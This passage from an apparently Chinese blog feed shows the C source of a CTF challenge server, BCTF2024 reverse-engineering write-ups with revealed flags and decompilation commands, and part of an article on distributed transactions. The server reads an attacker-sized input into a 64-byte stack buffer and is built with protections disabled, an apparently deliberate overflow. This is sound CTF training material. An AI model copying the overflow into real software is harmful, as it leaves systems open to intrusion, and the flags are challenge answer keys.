punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> client_sock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> magic<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"client_sock: %d\\n\"</span><span class=\"token punctuation\">,</span> client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\">// 读取 magic 字段</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>magic<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>magic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\">// 检查 magic 字段</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>magic <span class=\"token operator\">!=</span> MAGIC<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid magic number\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\">// 读取 size 字段</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>size<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\">// 读取 content 字段</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\">// 处理 content 字段</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received content: %s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"68\"></td><td><pre> * @description</pre></td></tr><tr><td data-num=\"69\"></td><td><pre> * 实现一个服务器程序，使用 TCP 协议监听指定的端口，并处理来自客户端的连接请求。</pre></td></tr><tr><td data-num=\"70\"></td><td><pre> * 服务器会打印出 \"Server listening on port XXXX\"，其中 XXXX 是端口号，然后进入死循环等待客户端的连接。</pre></td></tr><tr><td data-num=\"71\"></td><td><pre> * 当有新的客户端连接时，服务器会调用 handle_client 函数处理该连接。</pre></td></tr><tr><td data-num=\"72\"></td><td><pre> * 如果发生错误，则输出相应的错误信息并退出程序。</pre></td></tr><tr><td data-num=\"73\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"74\"></td><td><pre> * @param &#123;boolean&#125; isClientConnected</pre></td></tr><tr><td data-num=\"75\"></td><td><pre> * 表示是否已经连接到了客户端，默认为 false。</pre></td></tr><tr><td data-num=\"76\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"77\"></td><td><pre> * @returns &#123;number&#125;</pre></td></tr><tr><td data-num=\"78\"></td><td><pre> * 返回一个整数，表示服务器监听的端口号。</pre></td></tr><tr><td data-num=\"79\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">int</span> server_sock<span class=\"token punctuation\">,</span> client_sock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> server_addr<span class=\"token punctuation\">,</span> client_addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token class-name\">socklen_t</span> client_addr_len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>client_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token comment\">// 创建套接字</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    server_sock <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>server_sock <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token comment\">// 绑定地址和端口</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_family <span class=\"token operator\">=</span> AF_INET<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_addr<span class=\"token punctuation\">.</span>s_addr <span class=\"token operator\">=</span> INADDR_ANY<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_port <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span>PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>server_addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>server_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token comment\">// 监听连接</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Server listening on port %d\\n\"</span><span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token comment\">// 接受客户端连接</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>client_sock <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>client_addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>client_addr_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-o</span> iot_challenge main.c -fno-stack-protector <span class=\"token parameter variable\">-z</span> execstack -no-pie <span class=\"token parameter variable\">-m32</span></pre></td></tr></table></figure></div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/reverse/",
            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/reverse/",
            "title": "BCTF2024-REVERSE",
            "date_published": "2024-09-26T09:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-reverse\"><a class=\"anchor\" href=\"#bctf2024-reverse\">#</a> BCTF2024-REVERSE</h1>\n<h2 id=\"查看bin文件\"><a class=\"anchor\" href=\"#查看bin文件\">#</a> 查看 bin 文件</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>猜猜 flag 藏在哪</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9vdXRwdXQuYmlu\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/output.bin</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{a2467320ce0f9bc6fda0a1f714e49933}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>直接编辑器打开 就能找到 flag</p>\n<p>或者 strings ouput.bin | grep flag</p>\n</div></details>\n<h2 id=\"app端硬编码\"><a class=\"anchor\" href=\"#app端硬编码\">#</a> app 端硬编码</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小洋是一名移动前端开发工程师，一天他和后端开发工程师在调试授权认证服务，之后就愉快的发布了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9hcHAtZGVidWcuYXBr\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/app-debug.apk</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{755bc1e8fe421b40fbb225cb47a01bdb}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\n# 安装 apktool\n# https://apktool.org/docs/install/\n\n# 解包\napktool d app-debug.apk\n\n\n# 翻一下路径，最后发现在\n# 路径 app-debug/smali_classes3/com/bctf2024/bctftest/MainActivity.smali\n\n# 有这么一行代码\nconst-string v4, &quot;ZmxhZ3s3NTViYzFlOGZlNDIxYjQwZmJiMjI1Y2I0N2EwMWJkYn0=&quot;\n\n解一下base64\n\n</code></pre>\n</div></details>\n<h2 id=\"代码还原\"><a class=\"anchor\" href=\"#代码还原\">#</a> 代码还原</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小浩是一名运维工程师，一次项目运维中，他误删除了一些脚本代码，看着缓存目录</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/__pycache__.zip</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{ffa04431e7c7a6b4959654ad082f74fb}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\npip3 install uncompyle6\n\nuncompyle6 -o . __pycache__/pluginbase.cpython-36.pyc\n\n</code></pre>\n</div></details>\n<h2 id=\"可执行文件反编译\"><a class=\"anchor\" href=\"#可执行文件反编译\">#</a> 可执行文件反编译</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小明写了个 python 小程序，为了防止代码泄漏，编译成了可执行文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9tYWlu\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/main</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{30a859e0efdaaf31adc8ca8326a4f8ba}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\npip3 install pyinstaller\n\nwget https://github.com/extremecoders-re/pyinstxtractor/blob/master/pyinstxtractor.py\n\npython3 pyinstxtractor.py main\n\ncd main_extracted\n\nuncompyle6 main.pyc &gt; main.py\n\n</code></pre>\n</div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/HighAvailability/distributed_transaction/",
            "url": "https://blog.twelveeee.top/2024/HighAvailability/distributed_transaction/",
            "title": "分布式事务",
            "date_published": "2024-08-04T16:30:00.000Z",
            "content_html": "<h1 id=\"分布式事务\"><a class=\"anchor\" href=\"#分布式事务\">#</a> 分布式事务</h1>\n<p>前言：<a href=\"https://blog.twelveeee.top/2024/HighAvailability/CAP_BASE/\">分布式 CAP 理论和 BASE 理论</a></p>\n<p><strong>强一致性</strong>：任何一次读都能读到某个数据的最近一次写的数据。在任意时刻，所有节点中的数据是一样的。</p>\n<p><strong>弱一致性</strong>：数据更新后，如果能容忍后续的访问只能访问到部分或者全部访问不到，则是弱一致性。</p>\n<p><strong>最终一致性</strong>：不保证在任意时刻任意节点上的同一份数据都是相同的，但是随着时间的迁移，不同节点上的同一份数据总是在向趋同的方向变化。</p>\n<h2 id=\"刚性事务\"><a class=\"anchor\" href=\"#刚性事务\">#</a> 刚性事务</h2>\n<p>CAP 中的 CP</p>\n<p>遵循 ACID，对数据要求强一致性</p>\n<h3 id=\"两阶段提交\"><a class=\"anchor\" href=\"#两阶段提交\">#</a> 两阶段提交</h3>\n<p>两阶段提交（2PC - Prepare &amp; Commit）</p>\n<p>第一阶段：准备阶段：<br />\n协调者向所有参与者发送  <code>REQUEST-TO-PREPARE</code> <br />\n 当参与者收到 <code>REQUEST-TO-PREPARE</code>  消息后，向协调者发送消息 <code>PREPARED</code>  或者 <code>NO</code> ，表示事务是否准备好；如果发送的是 <code>NO</code> ，那么事务要回滚；</p>\n<p>第二阶段：提交阶段：<br />\n协调者收集所有参与者的返回消息，如果所有的参与者都回复的是 <code>PREPARED</code> ， 那么协调者向所有参与者发送 <code>COMMIT</code>  消息；否则，协调者向所有回复 <code>PREPARED</code>  的参与者发送 <code>ABORT</code>  消息；<br />\n参与者如果回复了 <code>PREPARED</code>  消息并且收到协调者发来的 <code>COMMIT</code>  消息，或者它收到 <code>ABORT</code>  消息，它将执行提交或回滚，并向协调者发送 <code>DONE</code>  消息以确认。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408042354178.webp\" alt=\"image\" /></p>\n<h3 id=\"三阶段提交\"><a class=\"anchor\" href=\"#三阶段提交\">#</a> 三阶段提交</h3>\n<p>三阶段提交 ( <code>CanCommit</code> 、 <code>PreCommit</code> 、 <code>DoCommit</code> )</p>\n<p><strong>CanCommit</strong>：协调者向所有参与者发送 CanCommit 命令，询问是否可以执行事务提交操作。如果全部响应 YES 则进入下一个阶段。</p>\n<p><strong>PreCommit</strong>：协调者向所有参与者发送 PreCommit 命令，询问是否可以进行事务的预提交操作，参与者接收到 PreCommit 请求后，如参与者成功的执行了事务操作，则返回 Yes 响应，进入最终 commit 阶段。一旦参与者中有向协调者发送了 No 响应，或因网络造成超时，协调者没有接到参与者的响应，协调者向所有参与者发送 abort 请求，参与者接受 abort 命令执行事务的中断。</p>\n<p><strong>DoCommit</strong>：在前两个阶段中所有参与者的响应反馈均是 YES 后，协调者向参与者发送 DoCommit 命令正式提交事务，如协调者没有接收到参与者发送的 ACK 响应，会向所有参与者发送 abort 请求命令，执行事务的中断。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408042357228.png\" alt=\"img\" /></p>\n<p>3PC 是对 2PC 的一种升级优化，<strong>3PC 在 2PC 的第一阶段和第二阶段中插入一个准备阶段</strong>。保证了在最后提交阶段之前，各参与者节点的状态都一致。同时在协调者和参与者中都引入超时机制，当参与者各种原因未收到协调者的 commit 请求后，会对本地事务进行 commit，不会一直阻塞等待，解决了 2PC 的单点故障问题，但 3PC 还是没能从根本上解决数据一致性的问题。</p>\n<h2 id=\"柔性事务\"><a class=\"anchor\" href=\"#柔性事务\">#</a> 柔性事务</h2>\n<p>CAP 中的 AP</p>\n<p>遵循 BASE，允许一定时间内不同节点的数据不一致，但要求最终一致。</p>\n<h3 id=\"补偿事务tcc\"><a class=\"anchor\" href=\"#补偿事务tcc\">#</a> 补偿事务（TCC ）</h3>\n<p>TCC（Try-Confirm-Cancel）又被称补偿事务，TCC 与 2PC 的思想很相似，事务处理流程也很相似。</p>\n<p>TCC 它的<strong>核心思想</strong>是：针对每个操作都要注册一个与其对应的 Try 和 Cancel。</p>\n<p><strong>Try</strong> 阶段：尝试执行，完成所有业务检查（一致性）, 预留必须业务资源（准隔离性）<br />\n<strong>Confirm</strong> 阶段：确认执行真正执行业务，不作任何业务检查，只使用 Try 阶段预留的业务资源，Confirm 操作满足幂等性。要求具备幂等设计，Confirm 失败后需要进行重试。<br />\n<strong>Cancel</strong> 阶段：取消执行，释放 Try 阶段预留的业务资源 Cancel 操作满足幂等性 Cancel 阶段的异常和 Confirm 阶段异常处理方案基本上一致。</p>\n<h3 id=\"saga事务\"><a class=\"anchor\" href=\"#saga事务\">#</a> SAGA 事务</h3>\n<p>Saga 是由一系列的本地事务构成。每一个本地事务在更新完数据库之后，会发布一条消息或者一个事件来触发 Saga 中的下一个本地事务的执行。如果一个本地事务因为某些业务规则无法满足而失败，Saga 会执行在这个失败的事务之前成功提交的所有事务的补偿操作。</p>\n<h3 id=\"本地消息表\"><a class=\"anchor\" href=\"#本地消息表\">#</a> <strong>本地消息表</strong></h3>\n<p>核心思路是将分布式事务拆分成本地事务进行处理。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408050012899.png\" alt=\"image-20240805001206162\" /></p>\n<ol>\n<li>当系统 A 被其他系统调用发生数据库表更操作，首先会更新数据库的业务表，其次会往相同数据库的消息表中插入一条数据，两个操作发生在同一个事务中</li>\n<li>系统 A 的脚本定期轮询本地消息往 mq 中写入一条消息，如果消息发送失败会进行重试</li>\n<li>系统 B 消费 mq 中的消息，并处理业务逻辑。如果本地事务处理失败，会在继续消费 mq 中的消息进行重试，如果业务上的失败，可以通知系统 A 进行回滚操作</li>\n</ol>\n<p>本地消息表实现的<strong>条件</strong>：</p>\n<ol>\n<li>消费者与生成者的接口都要支持幂等</li>\n<li>生产者需要额外的创建消息表</li>\n<li>需要提供补偿逻辑，如果消费者业务失败，需要生产者支持回滚操作</li>\n</ol>\n<p><strong>容错机制</strong>：</p>\n<ol>\n<li>步骤 1 失败时，事务直接回滚</li>\n<li>步骤 2、3 写 mq 与消费 mq 失败会进行重试</li>\n<li>步骤 3 业务失败系统 B 向系统 A 发起事务回滚操作</li>\n</ol>\n<p><strong>实际应用：</strong></p>\n<p>比如订单状态变更之后，会见消息记录写入 mq，消费者消费消息，触发事件，给用户发短信等等。</p>\n<h3 id=\"mq事务\"><a class=\"anchor\" href=\"#mq事务\">#</a> MQ 事务</h3>\n<p>实际上是对本地消息表的一个封装，将本地消息表移动到了 MQ 内部。</p>\n<h3 id=\"最大努力通知\"><a class=\"anchor\" href=\"#最大努力通知\">#</a> 最大努力通知</h3>\n<p>最大努力通知也称为定期校对，是对 MQ 